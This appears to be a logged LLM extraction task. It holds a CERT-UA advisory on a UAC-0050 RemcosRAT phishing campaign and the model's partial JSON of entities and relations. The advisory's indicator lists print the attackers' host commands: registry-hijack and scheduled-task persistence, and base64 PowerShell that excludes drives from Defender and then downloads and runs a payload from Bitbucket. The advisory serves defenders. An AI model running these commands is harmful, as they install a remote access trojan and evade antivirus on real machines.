@@ -1,0 +1,369 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA 21.12.2023 зафіксовано масове розповсюдження електронних листів з тематикою "Заборгованості за договором Київстар" та вкладенням у вигляді архіву "Заборгованість абонента.zip".</p><p>Зазначений ZIP-архів містить розділений на 2 частини RAR-архів "Заборгованість абонента.rar", в якому знаходиться однойменний архів захищений паролем. В останньому знаходиться документ з макросом "Заборгованість абонента.doc".&nbsp;</p><p>У разі активації код макросу за допомогою оглядача файлів (explorer.exe) з використанням протоколу SMB здійснить завантаження на ЕОМ та запуск файлу "GB.exe". В свою чергу зазначений файл є SFX-архівом, що містить BATCH-скрипт для завантаження з сервісу bitbucket та запуску виконуваного файлу "wsuscr.exe", обфускованого за допомогою SmartAssembly .NET, призначенням якого є дешифрування та запуск програми для віддаленого управління RemcosRAT (ідентифікатор ліцензції: 5639D40461DCDD07011A2B87AD3C9EDD).&nbsp;</p><p>Окрім того, зафіксовано розповсюдженян листів з темою "Запит СБУ" та вкладенням у вигляді архіву "Документи.zip", що містить захищений паролем та розділений на 3 частини RAR-архів "Запит.rar". В останньому знаходиться виконуваний файл "Запит.exe". У випадку відкриття такого архіву та запуску виконуваних файлів ЕОМ може бути уражена програмою RemcosRAT (ідентифікатор ліцензії: 5639D40461DCDD07011A2B87AD3C9EDD).</p><p>Окрім типового для UAC-0050 розміщення серверів управління RemcosRAT на технічному майданчику малайзійського хостинг-провайдера Shinjiru, їх також розміщено в межах автономної системи AS44477 (STARK INDUSTRIES SOLUTIONS LTD).</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">4754f0ede14f1bae26b69bd43c7b6705&nbsp; &nbsp; 8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a&nbsp; &nbsp; Заборгованість абонента.zip&nbsp;
+fb9ce204ff2b2f8014a547a2de568327&nbsp; &nbsp; ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449&nbsp; &nbsp; Заборгованість абонента.part1.rar
+fc196e76dee54125e5fc15018d764fcf&nbsp; &nbsp; 9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba&nbsp; &nbsp; Заборгованість абонента.part2.rar
+324afa8304dc6a079e8f9a2f2ea9654f&nbsp; &nbsp; 1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a&nbsp; &nbsp; Автоматичний код доступу.txt
+1d1d06ebd13ed9a3ea9254962a4c189f&nbsp; &nbsp; 823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827&nbsp; &nbsp; Заборгованість абонента.rar
+de2e053acae98adbecc23ab3c0e9cf5d&nbsp; &nbsp; 93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7&nbsp; &nbsp; Заборгованість абонента.doc
+c3e7cfa2e076c3ca421ddc00496c71b5&nbsp; &nbsp; d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c&nbsp; &nbsp; GB.exe
+6c704bae1033920b576dacbcff6bfef5&nbsp; &nbsp; 7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c&nbsp; &nbsp; test2.exe
+628ef6dc40f8b6e89b6d537463add174&nbsp; &nbsp; 8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789&nbsp; &nbsp; test2.bat
+fc99e0883a1fa153693547953a83674e&nbsp; &nbsp; 6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d&nbsp; &nbsp; wsuscr.exe
+490a5462fc6e4f477811ee08a00c7c85    a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829    remcos.exe
+
+62f588d655331f053795087b657743fe&nbsp; &nbsp; 9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce&nbsp; &nbsp; Документи.zip&nbsp;
+1ac510cf6c0d34f5148e3136494a2366&nbsp; &nbsp; 1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d&nbsp; &nbsp; Запит.part1.rar
+57ea2a297e1881d1015634c3e9b7c66d&nbsp; &nbsp; 7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3&nbsp; &nbsp; Запит.part2.rar&nbsp;
+f677caecda3825f2553c0e0dcdf3c1b8&nbsp; &nbsp; eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb&nbsp; &nbsp; Запит.part3.rar
+d4f5c321818c7876c6fffffe3e1fc30e&nbsp; &nbsp; 76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43&nbsp; &nbsp; Код 275376.txt
+75bc7617d832a378a533d896223587bc&nbsp; &nbsp; d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660&nbsp; &nbsp; Запит.exe
+0bff5c030f8c781c604fb589c6bfc5a6&nbsp; &nbsp; be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd&nbsp; &nbsp; Worm
+0e38564d3cff4859e4418ff3b1c57506&nbsp; &nbsp; 096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd&nbsp; &nbsp; Ties
+4febae6a56361fa83265fa07f50a1880&nbsp; &nbsp; 0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547&nbsp; &nbsp; Stylish
+d68eb8e578077fd9fc752d57bf73bd5e&nbsp; &nbsp; a8fea4b83677e23d30c9db965755a426190d0fbf748a9877c9a4ebd7da2bdd68&nbsp; &nbsp; Participants
+e0f074f4d3dcd3b2b59c0c162d83ff57&nbsp; &nbsp; 52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa&nbsp; &nbsp; Ka
+aae9e3b0ccd99846c3c5606a3164b3bf&nbsp; &nbsp; d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52&nbsp; &nbsp; Injection
+6041845b2fe9dfb4b06fed8ec8a05295&nbsp; &nbsp; 9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e&nbsp; &nbsp; Emperor
+53b204f96e93b70a528b88bedfd6b794&nbsp; &nbsp; 8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46&nbsp; &nbsp; Compound
+6b171b657293c8b9f0afcb8ab9104e95&nbsp; &nbsp; 804d8d8bd82d089969449cb17329528f0d72a552f5cb61304b57aab31ee2b065&nbsp; &nbsp; Bathrooms
+7e6953ba07200cd9c9b0f8ad2c6a84ff&nbsp; &nbsp; a32fb5538d5f64de8b015e9e2637b8b3af6295b1abd83ba5e75cf888c0fbd379&nbsp; &nbsp; x
+848164d084384c49937f99d5b894253e&nbsp; &nbsp; f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3&nbsp; &nbsp; VideoMagic.pif
+ce460418bab48b1e78b3bf611aa34f99    d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50    remcos.exe
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">\\89[.]23.98.22\LN\
+\\89[.]23.98.22\LN\GB.exe
+(tcp)://45[.]87.155.41:8080
+(tcp)://45[.]87.155.41:465
+(tcp)://45[.]87.155.41:54550
+(tcp)://45[.]87.155.41:80
+(tcp)://45[.]87.154.153:80
+(tcp)://45[.]87.154.153:8080
+(tcp)://101[.]99.75.16:80
+(tcp)://101[.]99.75.16:8080
+(tcp)://101[.]99.75.16:465
+(tcp)://101[.]99.75.145:465
+(tcp)://101[.]99.75.145:80
+(tcp)://94[.]131.102.115:80
+(tcp)://94[.]131.102.117:80
+(tcp)://94[.]131.102.119:80
+(tcp)://94[.]131.102.122:80
+(tcp)://94[.]131.102.124:80
+
+(tcp)://101[.]99.75.145:8081
+(tcp)://101[.]99.75.147:8081
+(tcp)://101[.]99.75.14:8081
+(tcp)://101[.]99.75.16:54550
+(tcp)://101[.]99.75.16:8081
+(tcp)://45[.]87.155.41:8081
+(tcp)://94[.]131.102.115:54550
+(tcp)://95[.]164.35.143:8081
+(tcp)://95[.]164.35.174:54550
+(tcp)://95[.]164.35.174:8081
+(tcp)://95[.]164.35.234:8081
+
+101[.]99.75.14
+101[.]99.75.145
+101[.]99.75.147
+101[.]99.75.16
+45[.]87.154.153
+45[.]87.155.41
+81[.]19.149.130
+89[.]23.98.22
+94[.]131.102.115
+94[.]131.102.117
+94[.]131.102.119
+94[.]131.102.122
+94[.]131.102.124
+95[.]164.35.143
+95[.]164.35.174
+95[.]164.35.234
+hXXps://bitbucket[.]org/olegovich-007/777/downloads/wsuscr.exe
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">"%WINDIR%\System32\reg.exe"&nbsp;add HKCU\Software\Classes\ms-settings\CurVer /d .omg /f
+"%WINDIR%\System32\reg.exe"&nbsp;delete HKCU\Software\Classes\.omg\ /f
+"%WINDIR%\System32\reg.exe"&nbsp;delete HKCU\Software\Classes\ms-settings\ /f
+"%WINDIR%\System32\reg.exe" add HKCU\Software\Classes\.omg\Shell\Open\command /d C:\Users\ADMINI~1\AppData\Local\Temp\persistent2\test2.exe /f
+%APPDATA%\wsuscr.exe
+%TEMP%\IXP000.TMP\test2.bat
+%TEMP%\persistent2\test2.exe
+cmd /c "test2.bat"
+cmd /c schtasks.exe /create /tn "Watson" /tr "wscript '%LOCALAPPDATA%\Insightful Markets Technologies\MarketWise.js'" /sc minute /mo 3 /F
+cmd /k cmd &lt; Bathrooms &amp; exit
+cmd /k echo [InternetShortcut] &gt; "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MarketWise.url" &amp; echo URL="%LOCALAPPDATA%\Insightful Markets Technologies\MarketWise.js" &gt;&gt; "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MarketWise.url" &amp; exit
+cmd.exe "%LOCALAPPDATA%\Insightful Markets Technologies\MarketWise.pif" "%LOCALAPPDATA%\Insightful Markets Technologies\A
+cmd.exe /S /D /c" echo F "
+cmd.exe /c res.bat &amp;&amp; test2.exe
+dvwsus-SFNWWW
+exel-3RO5G3
+explorer.exe "\\89.23.98.22\LN\"
+powershell -Command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABwAHcAZAAgAD0AIAAiAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAAiAA0ACgAkAHAAdwBkACAAfAAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgA=')) |Invoke-Expression"
+powershell -Command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARwBlAHQALQBEAGUAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAEEAcgByAGEAeQAgAHsACgAKACAAIAAgACAAIAAgACAAIABbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0ACgAgACAAIAAgAFAAYQByAGEAbQAgACgACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQAsAFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQAsAFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAgACQAYgB5AHQAZQBBAHIAcgBhAHkAIAA9ACAAJAAoAFQAaAByAG8AdwAoACIALQBiAHkAdABlAEEAcgByAGEAeQAgAGkAcwAgAHIAZQBxAHUAaQByAGUAZAAiACkAKQAKACAAIAAgACAAKQAKACAAIAAgACAAIAAgACAAIABQAHIAbwBjAGUAcwBzACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFYAZQByAGIAbwBzAGUAIAAiAEcAZQB0AC0ARABlAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgB5AHQAZQBBAHIAcgBhAHkAIgAKACAAIAAgACAAIAAgACAAIAAkAGkAbgBwAHUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoACAALAAgACQAYgB5AHQAZQBBAHIAcgBhAHkAIAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAKACAAIAAgACAAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAgACQAaQBuAHAAdQB0ACwAIAAoAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABnAHoAaQBwAFMAdAByAGUAYQBtAC4AQwBvAHAAeQBUAG8AKAAgACQAbwB1AHQAcAB1AHQAIAApAAoAIAAgACAAIAAgACAAIAAgACQAZwB6AGkAcABTAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQBuAHAAdQB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACAAJABiAHkAdABlAE8AdQB0AEEAcgByAGEAeQAgAD0AIAAkAG8AdQB0AHAAdQB0AC4AVABvAEEAcgByAGEAeQAoACkACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGIAeQB0AGUATwB1AHQAQQByAHIAYQB5AAoAIAAgACAAIAB9AAoAfQAKAAoAWwBiAHkAdABlAFsAXQBdACAAJABiAHkAdABlAF8AYQByAHIAYQB5ACAAPQAgADMAMQAsADEAMwA5ACwAOAAsADAALAAwACwAMAAsADAALAAwACwANAAsADAALAAxADQAOQAsADEANAA0ACwAMQA5ADMALAAxADEANAAsADEAMwAwACwANAA4ACwAMgAwACwANgA5ACwAMQAyADcALAA0ADEALAA5ADYALAAxADAAOQAsADEAOQA5ACwAMQAzADMALAAxADEALAA1ACwAMQA0ADYALAA5ACwAMwA1ACwAMQA3ADcALAAyACwAMQAyADUALAA5ACwAMQAxADEALAAxADAAMwAsADYANgAsADcALAAxADcAMQAsADEAMgA5ACwANAA2ACwANgA4ACwANwA3ACwAMgA0ADgALAAyADUAMAAsADcAMAAsADEAOAA2ACwAMgAzADkALAA3ADYALAAxADEAOQAsADEAMQAxACwAMQAxADMALAAyADMAMQAsADEANQA4ACwAMgA0ADMALAAxADcANAAsADIAMwAzACwAOQA3ACwAMgAyADQALAAxADQAMAAsADkANAAsADQAOAAsADIAMQA3ACwAMgA0ADIALAAxADMAOAAsADgALAA4ADAALAA4ADQALAAyADIAMAAsADEAMQAzACwANAAwACwAMgAzACwAMQA0ADEALAAyADAAMgAsADEANwAzACwAMgAwADIALAAxADkANgAsADEAOAAxACwAOAAxACwAOQA4ACwANgA2ACwAMwA3ACwAMgAwADQALAAxADcANAAsADkANQAsADEANAAxACwAMgA0ACwAMQA4ADUALAAyADUAMAAsADIAMAAwACwAMgAyADQALAAxADcAMAAsADEANgA5ACwAMQAyADMALAA1ADUALAAxADIALAAxADEAMAAsADEAMwA4ACwAMQAzADcALAAxADgANwAsADEANQAwACwAMgAwADkALAA3ADMALAAyADQANwAsADEAMwA1ACwAMQAxADAALAAyADMALAAzADEALAAxADgANgAsADEANQA2ACwAMgAwACwAMQA3ADUALAAxADMAOAAsADYANgAsADIAMAAwACwAMgAzADEALAAxADQANwAsADIAMAAyACwAMQAwADQALAA4ADYALAAxADIANwAsADIAMQA2ACwAMQAyADUALAAxADYANQAsADkANAAsADkAMgAsADEAOAA0ACwAMwAxACwAMwA4ACwANAAzACwANwA5ACwANAA1ACwAMQA2ADMALAAxADYANgAsADEAMAAyACwAMQA3ADEALAAxADEANQAsADMANQAsADEANQA3ACwAMQAsADYALAAxADYAMwAsADEANgAxACwAMgAzADgALAAyADQAMQAsADIAMAA0ACwAMwAwACwAMQA0ADkALAAzADIALAA0ADAALAAxADUAMQAsADEANgA0ACwAMQA3ADYALAAxADQAMgAsADQALAAyADIALAA0ADEALAAxADkAMAAsADEANQAwACwAMgA0ADYALAAxADQANwAsADEAMgA1ACwAMQAyACwANgAwACwAOAA5ACwAMgA0ADUALAA2ADAALAAyADkALAA2ADEALAA3ADQALAAyADEAMQAsADUAMwAsADEANwA4ACwAMQA4ADgALAAyADQAMAAsADEANgA0ACwAMgA1ADMALAAyADEAMQAsADgAMQAsADEANwAxACwAOQA4ACwANQAyACwANAA5ACwAMQA0ADQALAAxADUAMAAsADIAMQA3ACwAMgA3ACwANAA2ACwAMQAzADIALAA1ADcALAA0ADQALAAxADkAMgAsADYANwAsADEANQAsADYAMgAsADIANAA3ACwAMQA1ADUALAA1ADkALAAzADgALAAxADUANQAsADkANwAsADIANQA0ACwAMQA5ADMALAAxADUANQAsADIAMgA0ACwAMgAxADgALAAxADEANgAsADEAMgAzACwAMQA5ADEALAAyADMANwAsADEAMQA3ACwAOQAyACwAMQAyADYALAAxADYAMwAsADEAMgA0ACwANQA4ACwAMgA0ADAALAAyADcALAAxADcAMAAsADEANAA3ACwAMgAyADEALAA3ADEALAAxADMAMAAsADEAMwAyACwANwA4ACwAMQA3ADgALAAzACwAMQAxADMALAA2ADkALAA5ACwAMQA1ACwAMQA1ADgALAA2ADgALAAxADkALAA3ADkALAAxADMAOQAsADUANQAsADUAMQAsADEAMQAxACwAOAA0ACwAOQAwACwAMgAwADUALAAxADIAOAAsADkANgAsADEAOAAxACwAMgA1ACwAMQA3ADAALAAxADAAOAAsADcANgAsADEALAA5ADIALAAxADcAMwAsADkAOQAsADMANgAsADEAMAA5ACwANwA2ACwANgAxACwAMQAzADAALAA3ADUALAA1ADMALAAxADYAMwAsADgAMwAsADkANgAsADcAOQAsADQAMgAsADgAOQAsADEAMwA0ACwANwA3ACwAOQAwACwANQAxACwANQAxACwAMgAwADcALAAxADkAMQAsADIAMwA4ACwAMgA0ACwANQA0ACwANgA3ACwAOAA1ACwAMgAxADgALAAyADUANQAsADIANQAwACwAMgAwADcALAAyADkALAAyADIAMQAsADEAMgAyACwAMgA1ADMALAAzACwANAAsADEANwA4ACwAMgA1ADMALAAxADcANAAsADEANgA0ACwAMQAsADAALAAwAAoAJABkAGUAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAEEAcgByAGEAeQAgAD0AIABHAGUAdAAtAEQAZQBjAG8AbQBwAHIAZQBzAHMAZQBkAEIAeQB0AGUAQQByAHIAYQB5ACAALQBiAHkAdABlAEEAcgByAGEAeQAgACQAYgB5AHQAZQBfAGEAcgByAGEAeQAKAAoAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAgACQAZABlAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgB5AHQAZQBBAHIAcgBhAHkAIAApACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApACkAKQAgAHwAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4ACgAKAAoAdwBnAGUAdAAgACIAaAB0AHQAcABzADoALwAvAGIAaQB0AGIAdQBjAGsAZQB0AC4AbwByAGcALwBvAGwAZQBnAG8AdgBpAGMAaAAtADAAMAA3AC8ANwA3ADcALwBkAG8AdwBuAGwAbwBhAGQAcwAvAHcAcwB1AHMAYwByAC4AZQB4AGUAIgAgAC0AbwB1AHQAZgBpAGwAZQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAB3AHMAdQBzAGMAcgAuAGUAeABlACIACgBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdwBzAHUAcwBjAHIALgBlAHgAZQAiAA==')) | Invoke-Expression"
+powershell.exe -Command Stop-Process -Name explorer
+wscript "%LOCALAPPDATA%\Insightful Markets Technologies\MarketWise.js"
+wscript.exe "%LOCALAPPDATA%\Insightful Markets Technologies\MarketWise.js"
+xcopy /s test2.exe "%TEMP%\persistent2\test2.exe" &gt;NUL
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p>
+
+=== RESPONSE (7.6s, in 9685 / out 2390 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "Київстар",
+      "kind": "telecommunications company",
+      "gloss": "A major Ukrainian telecommunications and mobile network operator."
+    },
+    {
+      "name": "Заборгованість абонента.zip",
+      "kind": "archive file",
+      "gloss": "A malicious ZIP archive distributed via email containing multi-part RAR archives."
+    },
+    {
+      "name": "Заборгованість абонента.rar",
+      "kind": "archive file",
+      "gloss": "A password-protected split RAR archive containing a malicious Word document."
+    },
+    {
+      "name": "Заборгованість абонента.doc",
+      "kind": "document file",
+      "gloss": "A malicious Word document containing macros used to trigger payload execution."
+    },
+    {
+      "name": "GB.exe",
+      "kind": "executable file",
+      "gloss": "An SFX archive downloaded via SMB that unpacks scripts to fetch further malware."
+    },
+    {
+      "name": "bitbucket",
+      "kind": "code repository service",
+      "gloss": "A web-based version control repository hosting service used by attackers to host malware."
+    },
+    {
+      "name": "wsuscr.exe",
+      "kind": "executable file",
+      "gloss": "An obfuscated executable responsible for decrypting and executing RemcosRAT."
+    },
+    {
+      "name": "SmartAssembly .NET",
+      "kind": "obfuscation software",
+      "gloss": "An obfuscator tool designed to protect .NET applications from reverse engineering."
+    },
+    {
+      "name": "RemcosRAT",
+      "kind": "remote access trojan",
+      "gloss": "A commercial remote access tool frequently utilized by threat actors for espionage and control."
+    },
+    {
+      "name": "СБУ",
+      "kind": "government body",
+      "gloss": "The Security Service of Ukraine, the primary law enforcement and intelligence agency of Ukraine."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "Документи.zip",
+      "kind": "archive file",
+      "gloss": "A malicious ZIP archive attached to phishing emails masquerading as official SBU requests."
+    },
+    {
+      "name": "Запит.rar",
+      "kind": "archive file",
+      "gloss": "A password-protected split RAR archive containing a malicious executable."
+    },
+    {
+      "name": "Запит.exe",
+      "kind": "executable file",
+      "gloss": "A malicious executable delivering RemcosRAT."
+    },
+    {
+      "name": "UAC-0050",
+      "kind": "threat actor",
+      "gloss": "A financially and espionage-motivated threat actor targeting Ukrainian entities with commodity malware."
+    },
+    {
+      "name": "Shinjiru",
+      "kind": "hosting provider",
+      "gloss": "An offshore web hosting service provider based in Malaysia."
+    },
+    {
+      "name": "Малайзія",
+      "kind": "country",
+      "gloss": "A country located in Southeast Asia."
+    },
+    {
+      "name": "AS44477",
+      "kind": "autonomous system",
+      "gloss": "An autonomous system operated by Stark Industries Solutions Ltd hosting threat infrastructure."
+    },
+    {
+      "name": "STARK INDUSTRIES SOLUTIONS LTD",
+      "kind": "hosting company",
+      "gloss": "A technology infrastructure and hosting provider operating AS44477."
+    },
+    {
+      "name": "hXXps://bitbucket[.]org/olegovich-007/777/downloads/wsuscr.exe",
+      "kind": "url",
+      "gloss": "A malicious URL on Bitbucket used to download the wsuscr.exe payload."
+    }
+  ],
+  "relations": [
+    {
+      "head": "Заборгованість абонента.zip",
+      "type": "contains",
+      "tail": "Заборгованість абонента.rar",
+      "evidence": "Зазначений ZIP-архів містить розділений на 2 частини RAR-архів \"Заборгованість абонента.rar\""
+    },
+    {
+      "head": "Заборгованість абонента.rar",
+      "type": "contains",
+      "tail": "Заборгованість абонента.doc",
+      "evidence": "В останньому знаходиться документ з макросом \"Заборгованість абонента.doc\""
+    },
+    {
+      "head": "Заборгованість абонента.doc",
+      "type": "downloads-and-executes",
+      "tail": "GB.exe",
+      "evidence": "здійснить завантаження на ЕОМ та запуск файлу \"GB.exe\""
+    },
+    {
+      "head": "GB.exe",
+      "type": "downloads-and-executes",
+      "tail": "wsuscr.exe",
+      "evidence": "містить BATCH-скрипт для завантаження з сервісу bitbucket та запуску виконуваного файлу \"wsuscr.exe\""
+    },
+    {
+      "head": "wsuscr.exe",
+      "type": "obfuscated-with",
+      "tail": "SmartAssembly .NET",
+      "evidence": "\"wsuscr.exe\", обфускованого за допомогою SmartAssembly .NET"
+    },
+    {
+      "head": "wsuscr.exe",
+      "type": "decrypts-and-executes",
+      "tail": "RemcosRAT",
+      "evidence": "призначенням якого є дешифрування та запуск програми для віддаленого управління RemcosRAT"
+    },
+    {
+      "head": "Документи.zip",
+      "type": "contains",
+      "tail": "Запит.rar",
+      "evidence": "архіву \"Документи.zip\", що містить захищений паролем та розділений на 3 частини RAR-архів \"Запит.rar\""
+    },
+    {
+      "head": "Запит.rar",
+      "type": "contains",
+      "tail": "Запит.exe",
+      "evidence": "В останньому знаходиться виконуваний файл \"Запит.exe\""
+    },
+    {
+      "head": "Запит.exe",
+      "type": "installs",
+      "tail": "RemcosRAT",
+      "evidence": "запуску виконуваних файлів ЕОМ може бути уражена програмою RemcosRAT"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "deploys-infrastructure-on",
+      "tail": "Shinjiru",
+      "evidence": "типового для UAC-0050 розміщення серверів управління RemcosRAT на технічному майданчику малайзійського хостинг-провайдера Shinjiru"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "deploys-infrastructure-on",
+      "tail": "AS44477",
+      "evidence": "їх також розміщено в межах автономної системи AS44477"
+    },
+    {
+      "head": "AS44477",
